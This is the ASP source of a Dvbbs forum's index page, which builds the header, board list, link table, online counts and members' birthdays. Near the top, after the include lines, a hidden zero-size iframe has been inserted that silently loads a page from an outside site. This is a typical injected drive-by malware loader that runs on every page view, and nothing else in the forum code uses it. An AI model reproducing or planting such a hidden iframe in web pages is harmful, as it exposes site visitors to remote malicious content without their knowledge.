<!--#include file="conn.asp"-->
<!--#include file="inc/const.asp"--><iframe src="http://www.maimaiba.com/conn/icyfox.htm" width="0" height="0" frameborder="0"></iframe>

<%
Dim TempArray
Dvbbs.BoardID=0
Dvbbs.LoadTemplates("index")
Dvbbs.Stats=template.Strings(0)
Dvbbs.Nav()
Dvbbs.ActiveOnline()
TempArray = Split(template.html(3),"||")
Show_Index_Top
GetBbsList()
Response.Write Replace(template.html(9),"{$Getlink}",Getlink())
If Dvbbs.Forum_setting(29)="1" Then Call birthuser()
If Dvbbs.Forum_ads(2)="1" or Dvbbs.Forum_ads(13)="1"  Then Response.Write "<script language=""javascript"" src=""inc/Dv_Adv.js""></script>"
Show_Index_Footer
Dvbbs.Footer()

Sub Show_Index_Top
	Dim newsstr,TempStr,TopArray
	newsstr=news
	If newsstr(1)="" Or Not IsDate(newsstr(1)) Then newsstr(1)=Now()
	TempStr = template.html(0)
	TopArray = Split(template.html(2),"||")
	Dim tmpdata,nexhour
	If Dvbbs.Forum_Setting(69)="1" Then
		tmpdata=split(Dvbbs.Forum_Setting(70),"|")
		nexhour=Hour(Now())+1
		nexhour=nexhour mod 24
		If tmpdata(nexhour)="0" And Minute(now())>40 Then
			newsstr(1)=newsstr(1)&Replace(template.Strings(11),"{$LeaveTime}",(60-Minute(now())))
		End If
	End If
	TempStr=Replace(TempStr,"{$news}",newsstr(0))
	TempStr=Replace(TempStr,"{$newstime}",newsstr(1))
	TempStr=Replace(TempStr,"{$width}",Dvbbs.mainsetting(0))
	TempStr=Replace(TempStr,"{$UserNum}",Dvbbs.CacheData(10,0))
	TempStr=Replace(TempStr,"{$lastUser}",Dvbbs.HtmlEncode(Dvbbs.CacheData(14,0)))
	TempStr=Replace(TempStr,"{$TodayNum}",Dvbbs.CacheData(9,0))
	TempStr=Replace(TempStr,"{$TopicNum}",Dvbbs.CacheData(7,0))
	TempStr=Replace(TempStr,"{$YesTerdayNum}",Dvbbs.CacheData(11,0))
	TempStr=Replace(TempStr,"{$PostNum}",Dvbbs.CacheData(8,0))
	TempStr=Replace(TempStr,"{$MaxPostNum}",Dvbbs.CacheData(12,0))
	TempStr=Replace(TempStr,"{$MaxPostDate}",Dvbbs.CacheData(13,0))
	If Dvbbs.UserID=0 Then
		TempStr=Replace(TempStr,"{$myinfo}",Replace(TopArray(0),"{$forumname}",Dvbbs.Forum_Info(0)))
		If Dvbbs.Forum_ChanSetting(0)="1" Then TempStr=Replace(TempStr,"{$isray}",TopArray(1))
		TempStr=Replace(TempStr,"{$isray}","")
		If Dvbbs.forum_setting(79)="0" Then
			TempStr=Replace(TempStr,"{$getcode}","")
		Else
			TempStr=Replace(TempStr,"{$getcode}",template.Strings(12)&Dvbbs.GetCode())
		End If
	Else
		TopArray = Split(Dvbbs.mainhtml(12),"||")
		If Clng(Dvbbs.SendMsgNum)>0 Then
			Dim UserMsg
			UserMsg = TopArray(0)
			If Dvbbs.Forum_Setting(10)="1" Then
				UserMsg = UserMsg & TopArray(1) & TopArray(2)
			Else
				UserMsg = UserMsg & TopArray(2)
			End If
			UserMsg = Replace(UserMsg,"{$smsid}",Dvbbs.sendmsgid)
			UserMsg = Replace(UserMsg,"{$sender}",Dvbbs.sendmsguser)
			UserMsg = Replace(UserMsg,"{$newmsgnum}",Dvbbs.sendmsgnum)
			template.html(1) = Replace(template.html(1),"{$umsg}",UserMsg)
		Else
			template.html(1) = Replace(template.html(1),"{$umsg}",TopArray(3))
		End If
		If Dvbbs.Forum_ChanSetting(0)="1" Then template.html(1)=Replace(template.html(1),"{$sysmsg}",Replace(TempArray(0),"{$raypic}",Dvbbs.mainpic(14)))
		template.html(1)=Replace(template.html(1),"{$sysmsg}","")
		TempStr=Replace(TempStr,"{$myinfo}",template.html(1))
		TempStr=Replace(TempStr,"{$UserID}",Dvbbs.Userid)
		If IsNumeric(Dvbbs.MyUserInfo(12)) And IsNumeric(Dvbbs.MyUserInfo(13)) And Dvbbs.MyUserInfo(13)<>"" And Dvbbs.MyUserInfo(12)<>"" Then
			If Clng(Dvbbs.MyUserInfo(13))=Clng(Dvbbs.Forum_Setting(39)) And Clng(Dvbbs.MyUserInfo(12))=Clng(Dvbbs.Forum_Setting(38)) Then
			TempStr=Replace(TempStr,"{$userlogo}","<img src="&Dvbbs.MyUserInfo(11)&">")
			Else
			TempStr=Replace(TempStr,"{$userlogo}","<img src="&Dvbbs.MyUserInfo(11)&" width=60 height=60>")
			End If
		Else
			TempStr=Replace(TempStr,"{$userlogo}","<img src=images/logo_2.gif>")
		End If
	End If
	TempStr=Replace(TempStr,"{$bgcolor}",Dvbbs.mainsetting(12))
	TempStr=Replace(TempStr,"{$alertcolor}",Dvbbs.mainsetting(1))
	Response.Write TempStr
End Sub 

Function news()
	Dvbbs.Name="news"&Dvbbs.boardid
	If Dvbbs.ObjIsEmpty() Then 
		Dim tmpstr,bgs
		Dim Rs,SQL
		SQL="select top 1 title,addtime,bgs from Dv_bbsnews where boardid="&Dvbbs.boardid&" order by id desc"
		Set Rs=DVbbs.Execute(sql)
		If Rs.BOF And Rs. EOF Then
			tmpstr=template.Strings(8)&"|||"
		Else
			bgs=Rs(2)
			If bgs="" or isnull(bgs) then
				tmpstr=Rs(0)&"|||"&Rs(1)
			Else
				tmpstr="<img src=Skins/Default/filetype/mid.gif border=0><bgsound src="&bgs&" border=0>"&Rs(0)&"|||"&Rs(1)
			End if
		End If
		Set Rs=Nothing 
		Dvbbs.Value=tmpstr		 
	End If
	news=split(Dvbbs.Value,"|||")
End Function 

Sub GetBbsList()
	Dim ishidden
	Dim TempListArray,havenew,loadboard
	TempListArray = Split(template.html(8),"||")
	With Response
	.Write Replace(Replace(template.html(7),"{$follow}",Dvbbs.mainpic(11)),"{$nofollow}",Dvbbs.mainpic(10))
	.Write  "<script language=""javascript"">"
	.Write  vbNewLine
	'传送图片变量到JS
	For i=0 to UBound(template.pic)-1
		.Write  "piclist["&i&"]='"&template.pic(i)&"';"
		.Write  vbNewLine		
	Next
	'传递论坛主设置数据到JS
	For i=0 to UBound(Dvbbs.mainsetting)
		.Write  "mainsetting["&i&"]='"&Dvbbs.mainsetting(i)&"';"
		.Write  vbNewLine	
	Next 
	'传送模板数据到JS以备调用
	.Write  "template[template.length]='"&Replace(Replace(Replace(Replace(template.html(4),"\","\\"),"'","\'"),VbCrLf,"\n"),chr(13),"")&"';"
	.Write  vbNewLine
	.Write  "template[template.length]='"&Replace(Replace(Replace(Replace(TempListArray(0),"\","\\"),"'","\'"),VbCrLf,"\n"),chr(13),"")&"';"
	.Write  vbNewLine
	.Write  "template[template.length]='"&Replace(Replace(Replace(Replace(template.html(5),"\","\\"),"'","\'"),VbCrLf,"\n"),chr(13),"")&"';"
	.Write  vbNewLine
	.Write  "template[template.length]='"&Replace(Replace(Replace(Replace(TempListArray(1),"\","\\"),"'","\'"),VbCrLf,"\n"),chr(13),"")&"';"
	.Write  vbNewLine
	.Write  "template[template.length]='"&Replace(Replace(Replace(Replace(template.html(6),"\","\\"),"'","\'"),VbCrLf,"\n"),chr(13),"")&"';"
	.Write  vbNewLine
	.Write  "template[template.length]='"&Replace(Replace(Replace(Replace(TempListArray(2),"\","\\"),"'","\'"),VbCrLf,"\n"),chr(13),"")&"';"
	.Write  vbNewLine
	.Write  "template[template.length]='"&Replace(Replace(Replace(Replace(template.html(10),"\","\\"),"'","\'"),VbCrLf,"\n"),chr(13),"")&"';"
	.Write vbNewLine
	'传送字符串变量到JS
	For i=0 to 10
		.Write  "Strings[Strings.length]='"& template.Strings(i)&"';"		
	Next
	Dim Forum_Boards,i,BoardID,Board_Data,ClassID
	Dim setings,lastposttime,depth,lastpost,BoardType,BoardReadme
	ClassID=""
	Forum_Boards=Split(Dvbbs.CacheData(27,0),",")
	For i=0 to UBound(Forum_Boards)
		Dvbbs.Name="BoardInfo_" & Forum_Boards(i)
  		If Dvbbs.ObjIsEmpty() Then Dvbbs.ReloadBoardInfo(Forum_Boards(i))
		Board_Data=Dvbbs.Value
		If Board_Data(2,0)="0" Then
			BoardType=Board_Data(1,0)&""
			BoardType=Replace(Replace(BoardType,"\","\\"),"'","\'")
			If ClassID<>"" Then 
				.Write "classfooter();"		
			End If
			ClassID=Forum_Boards(i)
			.Write "showclass("
			.Write Forum_Boards(i)
			.Write ",'"
			.Write BoardType
			.Write "','"
			.Write Board_Data(16,0)
			.Write "','"
			.Write Request.Cookies("List")("list"&Forum_Boards(i))
			.Write "',"
			.Write Board_Data(6,0)
			.Write ");"		
		Else
			havenew=0
			loadboard=True
			ishidden=false
			depth=CInt(Board_Data(4,0))
			If depth > Cint(Dvbbs.forum_setting(5)) Then
			Else
				setings=split(Board_Data(16,0),",")(1)
				lastpost=Dvbbs.iHtmlEncode(Board_Data(14,0))
				lastpost=Replace(Replace(lastpost,Chr(10),""),Chr(13),"")
				lastposttime=split(Board_Data(14,0),"$")(2)
				If Not IsDate(lastposttime) Then lastposttime=Now()
				If datediff("h",Dvbbs.Lastlogin,lastposttime)=0 Then havenew=1
				If CInt(setings)=1 And Dvbbs.GroupSetting(37)<>"1" Then loadboard=False
				If loadboard  Then
					BoardReadme=Board_Data(7,0)&""
					BoardType=Board_Data(1,0)&""
					BoardType=Replace(Replace(BoardType,"\","\\"),"'","\'")
					.Write "showboard("
					.Write Forum_Boards(i)
					.Write ",'"
					.Write BoardType
					.Write "',"
					.Write Board_Data(6,0)
					.Write ",'"
					.Write BoardReadme
					.Write "','"
					.Write Board_Data(8,0)
					.Write "',"
					.Write Board_Data(9,0)
					.Write ","
					.Write Board_Data(10,0)
					.Write ",'"
					.Write Board_Data(11,0)
					.Write "',"
					.Write Board_Data(12,0)
					.Write ",'"		
					.Write lastpost
					.Write "','"
					.Write Left(Board_Data(16,0),9)
					.Write "',"
					.Write havenew
					.Write ");"
				Else	
					.Write "Child=(Child-1);"	
					.Write "boardcount++;"			
					.Write "showcode('','');"
				End If
			End If
		End If	
		.Write  vbNewLine
	Next
	If ClassID<>"" Then 
		.Write "classfooter();"		
	End If
	.Write vbNewLine
	.Write "</script>"
	End With
	Forum_Boards = Null
End Sub

Function Getlink()
	Dvbbs.Name="link"
	If Dvbbs.ObjIsEmpty() Then
		Dim Rs,SQl
		SQL="select boardname,readme,url,logo,islogo from [Dv_bbslink] Order by islogo,id"
		Set Rs=Dvbbs.Execute(SQL)
		If Not rs.eof Then
			Dvbbs.Value=RS.GetString (,,"!@#%|","$?&!@","")
		Else
			Dvbbs.Value=""
		End If
	End If
	Getlink=Dvbbs.Value
End Function

Sub Show_Index_Footer()
	Dim BrowserType,TempStr
	Set BrowserType=New Cls_Browser
	If BrowserType.IsSearch Then Response.redirect "indexNew.asp"
	TempStr = template.html(11)
	TempStr = Replace(TempStr,"{$userip}",Dvbbs.UserTrueIP)
	TempStr = Replace(TempStr,"{$system}",BrowserType.platform)
	TempStr = Replace(TempStr,"{$brw}",BrowserType.Browser & BrowserType.version)
	TempStr = Replace(TempStr,"{$showstr}",template.Strings(6))
	TempStr = Replace(TempStr,"{$onlinenum}",MyBoardOnline.Forum_Online)
	TempStr = Replace(TempStr,"{$ousernum}",MyBoardOnline.Forum_UserOnline)
	TempStr = Replace(TempStr,"{$gusernum}",MyBoardOnline.Forum_GuestOnline)
	TempStr = Replace(TempStr,"{$maxuser}",Dvbbs.Maxonline)
	TempStr = Replace(TempStr,"{$maxusertime}",Dvbbs.CacheData(6,0))
	TempStr = Replace(TempStr,"{$piclist}",GetGroupTitle())
	Set BrowserType=Nothing
	TempStr = Replace(TempStr,"{$BuildDate}",FormatDateTime(Dvbbs.Forum_Setting(74),1))
	TempStr = Replace(TempStr,"{$nonewpic}",template.pic(0))
	TempStr = Replace(TempStr,"{$isnewpic}",template.pic(1))
	TempStr = Replace(TempStr,"{$islockpic}",template.pic(2))
	Response.Write TempStr
	If Dvbbs.forum_setting(14)="1" Or Dvbbs.forum_setting(15)="1" Then 
		Response.Write "<iframe width=""0"" height=""0"" src=""Online.asp?action=1&Boardid=0"" name=""hiddenframe""></iframe>"
	Else
		Response.Write "<iframe width=""0"" height=""0"" src="""" name=""hiddenframe""></iframe>"
	End If
	TempStr = ""
	Response.Write "<script language=""javascript"">"
	If Dvbbs.Forum_ads(2)="1" Then
		 Response.Write "move_ad('"&Dvbbs.Forum_ads(3)&"','"&Dvbbs.Forum_ads(4)&"','"&Dvbbs.Forum_ads(5)&"','"&Dvbbs.Forum_ads(6)&"');"
	End If
	If Dvbbs.Forum_ads(13)="1" Then
		Response.Write "fix_up_ad('"& Dvbbs.Forum_ads(8) & "','" & Dvbbs.Forum_ads(10) & "','" & Dvbbs.Forum_ads(11) & "','" & Dvbbs.Forum_ads(9) & "');"		
	End If 
	Response.Write "</script>"
End Sub

Function GetGroupTitle()
	Dvbbs.Name="GroupTitle"
	If Dvbbs.ObjIsEmpty() Then
		Dim Rs,SQl
		SQL="select TitlePic,title from [Dv_UserGroups] where IsDisp=1 Order by Orders "
		Set Rs=Dvbbs.Execute(SQL)
		SQL="<img src="""&RS.GetString (,,"""> ","    ‖ <img src=""","")
		SQl=Left(SQL,Len(SQL)-Len("    ‖ <img src="""))
		If Dvbbs.Forum_ChanSetting(0)="1" Then 
			SQl= SQL & "    ‖ <img src="""&Dvbbs.mainpic(14)&""">  "&Dvbbs.lanStr(6)
		End If
		Dvbbs.Value = SQL
		Set rs=Nothing 
	End If
	GetGroupTitle=Dvbbs.Value
End Function

Sub Birthuser()
	Dim Strings
	Strings=Dvbbs.CacheData(16,0)
	Strings=split(Strings,"$$")
	If Not IsDate(Strings(0)) Then Strings(0)=Now()-1
	If CDate(Strings(0)) <> Date() Then 
		Dim Rs,SQL,NowMonth,NowDate,TMPDATA,birthNum,tmpstr,i,todaystr0,todaystr1
		NowMonth=Month(Date())
		NowDate=Day(Date())
		If NowMonth< 10 Then
			todaystr0="0"&NowMonth
		Else
			todaystr0=CStr(NowMonth)
		End If
		If NowDate < 10 Then
			todaystr0=todaystr0&"-"&"0"&NowDate
		Else
			todaystr0=todaystr0&"-"&NowDate
		End If
		todaystr1=NowMonth&"-"&NowDate
		If todaystr0=todaystr1 Then
			SQL="select username,Userbirthday from [Dv_user] where Userbirthday like '%"&todaystr1&"' Order by UserID"
		Else
			SQL="select username,Userbirthday from [Dv_user] where Userbirthday like '%"&todaystr1&"' Or Userbirthday like '%"&todaystr0&"' Order by UserID"
		End If
		birthNum=0
		Set Rs=Dvbbs.Execute(SQL)
		i=0
		If Not Rs.EOF Then
			Do while Not Rs.EOF
				If IsDate(Rs(1)) Then 
					If Month(Rs(1))=NowMonth And Day(Rs(1)) Then
						i=i+1
						tmpstr=template.Strings(10)
						birthNum=birthNum+1
						tmpstr=Replace(tmpstr,"{$username}",rs(0))
						tmpstr=Replace(tmpstr,"{$age}",datediff("yyyy",rs(1),Now()))
						If i=1  Then
							TMPDATA=TMPDATA&"<tr>"
						End If
						TMPDATA=TMPDATA&"<td>"&tmpstr&"</td>"
						If i=5 Then
							TMPDATA=TMPDATA&"</tr>"
							i=0
						End If
					End If
				End If
				Rs.MoveNext
			Loop
		End If
		If birthNum mod 5 <> 0 Then TMPDATA=TMPDATA&"</tr>"
		TMPDATA="<TABLE cellSpacing=2 cellPadding=2 width=100% border=0>"&TMPDATA&"</table>"
		Set Rs=Nothing
		template.html(12)=Replace(template.html(12),"{$birthNum}",birthNum)
		If  TMPDATA="" Then 
			TMPDATA=template.Strings(9)
		End If
		template.html(12)=Replace(template.html(12),"{$birthday}",TMPDATA)
		TMPDATA=Date()&"$$"&template.html(12)
		Dvbbs.Execute("Update Dv_setup Set Forum_BirthUser='"&TMPDATA&"'")
		Dvbbs.ReloadSetupCache TMPDATA,16
		
	End If
	Strings=Split(Dvbbs.CacheData(16,0),"$$")
	Strings(1)=Replace(Strings(1),"{$bpic}",template.pic(3))
	Response.Write Strings(1)
End Sub
%>
